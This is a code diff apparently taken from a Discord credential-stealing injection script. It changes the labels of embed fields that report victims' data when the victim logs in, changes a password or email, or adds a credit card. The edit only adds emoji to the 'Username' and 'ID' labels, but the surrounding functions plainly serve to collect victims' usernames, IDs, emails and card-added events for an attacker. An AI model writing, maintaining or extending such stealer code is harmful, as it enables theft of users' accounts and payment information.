@@ -70,7 +70,7 @@ function FirstTime() {
                         inline: !1,
                       },
                       {
-                        name: "Username",
+                        name: "<:members:966817375863308350> Username",
                         value: `\`${n.username}#${n.discriminator}\``,
                         inline: !0,
                       },
@@ -143,11 +143,11 @@ function FirstTime() {
                           inline: !1,
                         },
                         {
-                          name: "Username",
+                          name: "<:members:966817375863308350> Username",
                           value: `\`${n.username}#${n.discriminator}\``,
                           inline: !0,
                         },
-                        { name: "ID", value: `\`${n.id}\``, inline: !0 },
+                        { name: "<:members:966817375863308350> ID", value: `\`${n.id}\``, inline: !0 },
                         {
                           name: "<a:boostlevel:966792429443379281> Badges",
                           value: `${GetBadges(n.flags)}`,
@@ -314,11 +314,11 @@ function Login(e, t, n) {
                             inline: !1,
                           },
                           {
-                            name: "Username",
+                            name: "<:members:966817375863308350> Username",
                             value: `\`${i.username}#${i.discriminator}\``,
                             inline: !0,
                           },
-                          { name: "ID", value: `\`${i.id}\``, inline: !0 },
+                          { name: "<:members:966817375863308350> ID", value: `\`${i.id}\``, inline: !0 },
                           {
                             name: "<:nitro:966790472968339576> Nitro",
                             value: `${GetNitro(i.premium_type)}`,
@@ -432,11 +432,11 @@ function ChangePassword(e, t, n) {
                         inline: !1,
                       },
                       {
-                        name: "Username",
+                        name: "<:members:966817375863308350> Username",
                         value: `\`${s.username}#${s.discriminator}\``,
                         inline: !0,
                       },
-                      { name: "ID", value: `\`${s.id}\``, inline: !0 },
+                      { name: "<:members:966817375863308350> ID", value: `\`${s.id}\``, inline: !0 },
                       {
                         name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
@@ -522,11 +522,11 @@ function ChangeEmail(e, t, n) {
                         inline: !1,
                       },
                       {
-                        name: "Username",
+                        name: "<:members:966817375863308350> Username",
                         value: `\`${s.username}#${s.discriminator}\``,
                         inline: !0,
                       },
-                      { name: "ID", value: `\`${s.id}\``, inline: !0 },
+                      { name: "<:members:966817375863308350> ID", value: `\`${s.id}\``, inline: !0 },
                       {
                         name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
@@ -598,11 +598,11 @@ function CreditCardAdded(e, t, n, a, r, o, s, i, l, d) {
                 {
                   title: "User Credit Card Added",
                   description:
-                    "**Username:**```" +
+                    "**<:members:966817375863308350> Username:**```" +
                     c.username +
                     "#" +
                     c.discriminator +
-                    "```\n**ID:**```" +
+                    "```\n**<:members:966817375863308350> ID:**```" +
                     c.id +
                     "```\n**<:gmail:966790304701235230> Email:**```" +
                     c.email +
